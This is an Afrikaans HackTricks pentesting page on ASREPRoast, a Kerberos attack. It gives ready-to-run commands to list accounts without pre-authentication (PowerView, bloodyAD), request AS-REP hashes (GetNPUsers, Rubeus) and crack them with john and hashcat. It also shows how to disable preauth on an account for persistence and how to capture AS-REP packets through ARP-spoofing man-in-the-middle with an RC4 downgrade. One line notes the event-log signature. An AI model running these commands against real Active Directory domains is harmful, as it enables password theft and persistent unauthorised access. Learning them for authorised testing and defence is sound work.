# ASREPRoast

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en foutbeloningsjagters te kommunikeer!

**Hacker-insigte**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hackery ondersoek

**Hacker Nuus in Werklikheid**\
Bly op hoogte van die snelveranderende hackery-wêreld deur middel van werklike nuus en insigte

**Nuutste Aankondigings**\
Bly ingelig met die nuutste foutbelonings wat bekendgestel word en kritieke platformopdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

## ASREPRoast

ASREPRoast is 'n sekuriteitsaanval wat gebruikers aanval wat die **Kerberos-voorafverifikasie vereiste kenmerk** ontbreek. Hierdie kwesbaarheid maak dit essensieel vir aanvallers om verifikasie vir 'n gebruiker van die Domeinbeheerder (DC) aan te vra sonder om die gebruiker se wagwoord nodig te hê. Die DC reageer dan met 'n boodskap wat versleutel is met die gebruiker se wagwoord-afgeleide sleutel, wat aanvallers offline kan probeer kraak om die gebruiker se wagwoord te ontdek.

Die hoofvereistes vir hierdie aanval is:
- **Gebrek aan Kerberos-voorafverifikasie**: Teikengebruikers moet hierdie sekuriteitsfunksie nie geaktiveer hê nie.
- **Koppeling met die Domeinbeheerder (DC)**: Aanvallers het toegang tot die DC nodig om versoek te stuur en versleutelde boodskappe te ontvang.
- **Opsionele domeinrekening**: Die besit van 'n domeinrekening stel aanvallers in staat om kwesbare gebruikers meer doeltreffend te identifiseer deur LDAP-navrae. Sonder so 'n rekening moet aanvallers gebruikersname raai.


#### Identifisering van kwesbare gebruikers (benodig domeinlegitimasie)

{% code title="Gebruik van Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Gebruik van Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Versoek AS_REP-boodskap

{% code title="Gebruik Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Gebruik van Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting met Rubeus sal 'n 4768 genereer met 'n enkripsie tipe van 0x17 en voorafgoedkeuring tipe van 0.
{% endhint %}

### Kraak
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Volharding

Dwing **preauth** nie vereis vir 'n gebruiker waar jy **GenericAll** toestemmings het (of toestemmings om eienskappe te skryf):

{% code title="Gebruik Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Gebruik van Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASreproast sonder geloofsbriewe
Sondef die kennis van gebruikers wat nie Kerberos-voorverifikasie benodig nie. 'n Aanvaller kan 'n man-in-die-middel-posisie gebruik om AS-REP-pakkette vas te vang terwyl hulle die netwerk deurloop.<br>
[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) stel ons in staat om dit te doen. Verder, dwing die gereedskap <ins>kliëntwerkstasies om RC4 te gebruik</ins> deur die Kerberos-onderhandeling te verander.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher.py relay -dc $DC_IP --keep-spoofing

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher.py relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASrepCatcher.py listen
```
## Verwysings

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en foutbeloningsjagters te kommunikeer!

**Hacken-insigte**\
Gaan in gesprek met inhoud wat die opwinding en uitdagings van hacken ondersoek

**Hacknuus in Werklikheid**\
Bly op hoogte van die snelveranderende hackwêreld deur werklikheidsnuus en insigte

**Nuutste Aankondigings**\
Bly ingelig met die nuutste foutbelonings wat bekendgestel word en noodsaaklike platformopdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 

</details>
